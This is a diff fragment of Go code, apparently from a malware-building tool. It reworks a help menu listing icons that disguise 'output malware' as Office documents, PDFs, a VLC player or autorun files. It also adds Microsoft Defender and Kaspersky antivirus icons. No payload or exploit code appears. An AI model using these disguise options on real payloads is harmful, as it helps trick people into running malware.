@@ -1748,21 +1748,23 @@ func ListIcons() {
         name string
         desc string
     }{
-        {"access","   Microsoft access document icon for your output malware"},
-        {"autorun","  Autorun standard icon to disguise your malicious malware"},
-        {"excel","    Microsoft excel document icon for your output malware"},
-        {"pdf","      Standard .pdf icon for your malicious backdoor"},
-        {"project","  Another icon found in microsoft office tools"},
-        {"publisher","Microsoft publisher document icon for your output malware"},
-        {"redrat","   A simple icon for a rat. This will fortunetly look suspicious"},
-        {"visio","    Microsoft access document icon for your output malware"},
-        {"vlc","      An icon that will output your malware as a vlc vidoe player"},
-        {"word","    Microsoft word document icon for your output malware"},
+        {"    access","Microsoft access document icon for your output malware"},
+        {"   autorun","Autorun standard icon to disguise your malicious malware"},
+        {"     excel","Microsoft excel document icon for your output malware"},
+        {"       pdf","Standard .pdf icon for your malicious backdoor"},
+        {"   project","Another icon found in microsoft office tools"},
+        {" publisher","Microsoft publisher document icon for your output malware"},
+        {"    redrat","A simple icon for a rat. This will fortunetly look suspicious"},
+        {"     visio","Microsoft access document icon for your output malware"},
+        {"       vlc","An icon that will output your malware as a vlc vidoe player"},
+        {"     word","Microsoft word document icon for your output malware"},
+        {" defender","Microsoft defender icon for your output malware"},
+        {"kaspersky","Kapersky antivirus icon for your output malware"},
     }
 
     for i, item := range items {
         fmt.Printf(`
-  %s%d. %s%-3s %s: %s`, bcolors.BrightBlue, i + 1, bcolors.Yellow, item.name, bcolors.Endc, item.desc)
+  %s%d. %s%-3s%s > %s`, bcolors.BrightBlue, i + 1, bcolors.Yellow, item.name, bcolors.Endc, item.desc)
     }
     info := ModuleHelpInfo{
         Example:          "    set icon access\n",
